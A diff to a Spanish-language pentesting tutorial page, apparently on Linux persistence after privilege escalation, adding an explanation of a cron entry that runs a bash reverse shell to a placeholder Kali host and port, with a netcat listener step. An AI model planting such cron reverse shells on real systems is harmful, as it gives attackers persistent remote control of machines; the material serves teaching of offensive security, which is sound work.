@@ -101,6 +101,11 @@ echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ip_kali/puerto_kali 0>&1'" > c
 crontab -i cron
 ```
 
+- `/bin/bash -c '...'`: inicia Bash y le indica que ejecute el comando que está entre comillas.
+`bash -i`: abre una instancia de Bash interactiva, necesaria para poder trabajar con ella como una terminal.
+- `>& /dev/tcp/ip_kali/puerto_kali`: Bash utiliza /dev/tcp/ para abrir una conexión TCP hacia la IP y el puerto indicados. La salida estándar y la salida de error de la shell se redirigen a esa conexión.
+- `0>&1`: redirige también la entrada estándar hacia el mismo canal, de modo que los comandos enviados desde el extremo remoto lleguen a la shell.
+
 Para establecer una conexión a partir de este momento basta con crear un listener en nuestra máquina kali con `nc -nvlp puerto_kali` y esperar a que se ejecute el comando en el objetivo.
 
 [⟵ Anterior](07_linux_privesc.md) | [Siguiente ⟶](09_.md)
